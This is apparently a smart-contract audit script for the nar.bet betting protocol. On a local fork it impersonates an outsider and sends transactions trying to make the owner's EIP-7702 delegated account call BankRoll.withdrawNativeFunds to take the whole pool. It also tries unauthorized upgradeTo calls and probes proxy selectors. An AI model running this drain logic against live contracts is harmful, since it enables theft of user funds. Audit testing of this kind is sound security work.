#!/usr/bin/env python3
"""nar.bet — S6: can a STRANGER act as the owner account (EIP-7702 delegate)?

The owner 0x4aD0d8f0… carries a 7702 delegation to 0x63c0c19a… (11,185 bytes): an ERC-4337 modular
smart account (validateUserOp 0x19822f7c, entryPoint() 0xb0d691fe, ERC-1271 isValidSignature,
ERC-165, eip712Domain, execute(bytes32,bytes) 0xe9ae5c53).

If a stranger can call `execute` on the owner account, they can make it call
BankRoll.withdrawNativeFunds(attacker, wholePool) — which would turn F04 from "operator-only" into an
outsider-reachable drain. That is the whole question.

Method: from a stranger EOA, attempt the real payload as a TRANSACTION (not just eth_call) and record
status + revert reason. Then sweep the delegate's unidentified selectors as a stranger.

Also covers the rest of S6: proxy admins, upgradeTo from a stranger, and the three minimal proxies'
implementations.
Output: fork/s6-owner-account.json
"""
import json, os, time, urllib.request
from eth_abi import encode, decode as abi_decode
from eth_utils import keccak

FORK = "http://127.0.0.1:8555"
BASE = os.path.expanduser("~/.hermes/workspace/SAVAGEAUD/TARGETS/narbet")
OWNER = "0x4aD0d8f0A100A74547e4B66C008CaE6e91Ef6d8b"
DELEG = "0x63c0c19a282a1b52b07dd5a65b58948a07dae32b"
BR = "0x71dc4a726C92E6bf506F2Afc2Cee8B63A89B29EC"
GAMES = {"RPS": "0x843D62ad75F5d0b383f8520e23d19174b7961b8E",
         "Mines": "0x3014d056Db789984552084Db359D7C56A620549b"}
MINIMAL = {"root149": ("0xE6d461c863987F2a1096eA3476137F30f75B3d46", "0x97526a253dcae184cbab869f16004765693ff1f7"),
           "registry149": ("0xa4338eadf4D2e0851eFb225b0Eab90bE47A095F1", "0xa3d8c3eea65bbd40d25191476b32c7f656f60519"),
           "resolver149": ("0x314582158A0a72802aD8F6EeE6243C73dCf1F562", "0xc3274962e9d165b0d332701afaed52078942344c")}
STRANGER = "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"
IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
ADMIN_SLOT = "0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103"

ABI = json.load(open(os.path.join(BASE, "recon", "abi-real.json")))
ERR = {}
for n, s in ABI["errors"].items():
    ins = s.get("inputs") or ""
    parts, depth, cur = [], 0, ""
    for ch in ins:
        if ch in "([":
            depth += 1
        elif ch in ")]":
            depth -= 1
        if ch == "," and depth == 0:
            parts.append(cur.strip()); cur = ""
        else:
            cur += ch
    if cur.strip():
        parts.append(cur.strip())
    tt, ok = [], True
    for p in parts:
        t = p.split()[0] if p.split() else p
        if t.startswith("tuple"):
            ok = False
            break
        tt.append(t)
    if ok:
        ERR["0x" + keccak(text=f"{n}({','.join(tt)})")[:4].hex()] = f"{n}({','.join(tt)})"

_id = [0]
def rpc(m, p, t=90):
    _id[0] += 1
    try:
        return json.loads(urllib.request.urlopen(urllib.request.Request(
            FORK, data=json.dumps({"jsonrpc": "2.0", "id": _id[0], "method": m, "params": p}).encode(),
            headers={"Content-Type": "application/json"}), timeout=t).read())
    except Exception as e:
        return {"error": {"message": str(e)[:120]}}


def call(to, data, frm=STRANGER, value=0):
    d = rpc("eth_call", [{"from": frm, "to": to, "data": data, "value": hex(value)}, "latest"])
    return d.get("result"), d.get("error")


def send(to, data, frm=STRANGER, value=0):
    d = rpc("eth_sendTransaction", [{"from": frm, "to": to, "data": data, "value": hex(value)}])
    return d.get("result"), d.get("error")


def rc(h):
    for _ in range(40):
        r = rpc("eth_getTransactionReceipt", [h]).get("result")
        if r:
            return r
        time.sleep(0.25)
    return None


def bal(a):
    v = rpc("eth_getBalance", [a, "latest"]).get("result")
    return int(v, 16) if v else 0


def expl(e):
    if not e:
        return "OK"
    d = e.get("data") or ""
    if d.startswith("0x08c379a0"):
        try:
            return "require: " + abi_decode(["string"], bytes.fromhex(d[10:]))[0]
        except Exception:
            return "require?"
    if len(d) >= 10:
        return f"custom {ERR.get(d[:10], d[:10])}"
    return f"empty revert ({e.get('message')})"


def main():
    out = {}
    MON = 10 ** 18
    rpc("anvil_impersonateAccount", [STRANGER]); rpc("anvil_setBalance", [STRANGER, hex(500 * MON)])
    pool = bal(BR)
    print(f"fork block {int(rpc('eth_block_number' if False else 'eth_blockNumber', []).get('result','0x0'),16)}")
    print(f"pool {pool/1e18:,.2f} MON; stranger funded {bal(STRANGER)/1e18:,.2f}\n")

    # the payload we WANT the owner account to run on our behalf
    inner = "0x26792aca" + encode(["address", "uint256"], [STRANGER, pool]).hex()   # withdrawNativeFunds(stranger, pool)
    print("=== A. can a stranger call execute() on the owner account? ===")
    print("   target payload: BankRoll.withdrawNativeFunds(stranger, whole pool)")

    modes = {"7579-single-call": "01" + "00" * 31,
             "zero-mode": "00" * 32}
    encodings = {}
    try:
        encodings["7579 abi.encode(target,value,data)"] = encode(
            ["address", "uint256", "bytes"], [BR, 0, bytes.fromhex(inner[2:])]).hex()
    except Exception as e:
        print("   enc err", e)
    encodings["packed(target,value,data)"] = (BR[2:].rjust(64, "0") + "0" * 64 + inner[2:])

    attempts = []
    for mn, mode in modes.items():
        for en, execdata in encodings.items():
            data = "0xe9ae5c53" + encode(["bytes32", "bytes"],
                                          [bytes.fromhex(mode), bytes.fromhex(execdata)]).hex()
            r, e = call(OWNER, data)
            attempts.append({"mode": mn, "encoding": en, "call": expl(e)})
            print(f"   eth_call mode={mn:16s} enc={en:34s} -> {expl(e)}")
            # real transaction
            h, terr = send(OWNER, data)
            rct = rc(h) if h else None
            status = rct and rct["status"]
            bal_after = bal(STRANGER)
            print(f"      tx status={status}  err={expl(terr)}  stranger delta={(bal_after - 500*MON)/1e18:+,.2f}")
            attempts[-1]["tx_status"] = status
            attempts[-1]["stranger_delta"] = (bal_after - 500 * MON) / 1e18
            if status == "0x1" and bal_after > 500 * MON:
                print("      *** STRANGER DRAINED THE POOL ***")
    out["execute_attempts"] = attempts
    print(f"\n   pool after attempts: {bal(BR)/1e18:,.2f} MON (unchanged = blocked)")

    print("\n=== B. sweep the delegate's unidentified selectors as a stranger ===")
    sw = json.load(open(os.path.join(BASE, "recon", "eip7702-delegate.json")))
    interesting = []
    for sel in sw["unidentified"]:
        for lbl, args in (("noargs", ""), ("addr", "0" * 24 + STRANGER[2:].lower()),
                          ("uint1", "0" * 63 + "1")):
            r, e = call(OWNER, sel + args)
            if e is None:
                res = (r or "0x")[:42]
                interesting.append({"sel": sel, "args": lbl, "result": f"RETURNS {res}"})
                print(f"   {sel} {lbl:7s} -> RETURNS {res}")
            else:
                d = (e.get("data") or "")
                if d and d != "0x":
                    interesting.append({"sel": sel, "args": lbl, "result": expl(e)})
                    print(f"   {sel} {lbl:7s} -> {expl(e)}")
    out["delegate_selector_probe"] = interesting

    print("\n=== C. upgrade / admin surface ===")
    admin = rpc("eth_getStorageAt", [GAMES["RPS"], ADMIN_SLOT, "latest"]).get("result")
    impl = rpc("eth_getStorageAt", [GAMES["RPS"], IMPLEMENTATION_SLOT, "latest"]).get("result")
    print(f"   RPS admin slot : {admin}")
    print(f"   RPS impl  slot : {impl}")
    print(f"   owner()        : {call(GAMES['RPS'], '0x8da5cb5b')[0]}")
    up = "0x3659cfe6" + "0" * 24 + STRANGER[2:].lower()
    print(f"   stranger upgradeTo(self) on RPS -> {expl(call(GAMES['RPS'], up)[1])}")
    print(f"   stranger upgradeTo(self) on BankRoll -> {expl(call(BR, up)[1])}")
    out["rps_admin_slot"] = admin
    out["rps_owner"] = call(GAMES["RPS"], "0x8da5cb5b")[0]
    out["stranger_upgrade_rps"] = expl(call(GAMES["RPS"], up)[1])
    out["stranger_upgrade_bankroll"] = expl(call(BR, up)[1])

    print("\n=== D. the three 149-byte minimal proxies: what do their impls expose? ===")
    import re
    for name, (proxy, impl_addr) in MINIMAL.items():
        code = rpc("eth_getCode", [impl_addr, "latest"]).get("result") or "0x"
        sels = sorted({"0x" + m.group(1) for m in re.finditer(r"63([0-9a-f]{8})14", code[2:])})
        named = []
        for s in sels:
            for cand in ["owner()", "getOwner()", "admin()", "initialize(address)", "registry()",
                         "root()", "resolver()", "implementation()", "upgradeTo(address)"]:
                if "0x" + keccak(text=cand)[:4].hex() == s:
                    named.append(f"{s}={cand}")
        print(f"   {name}: impl {impl_addr} {len(code)//2-1}B sels={len(sels)} {named[:5]}")
        out.setdefault("minimal_proxies", {})[name] = {"impl": impl_addr, "size": len(code) // 2 - 1,
                                                      "selectors": sels, "named": named}

    json.dump(out, open(os.path.join(BASE, "fork", "s6-owner-account.json"), "w"), indent=1)
    print("\nsaved fork/s6-owner-account.json")


if __name__ == "__main__":
    main()
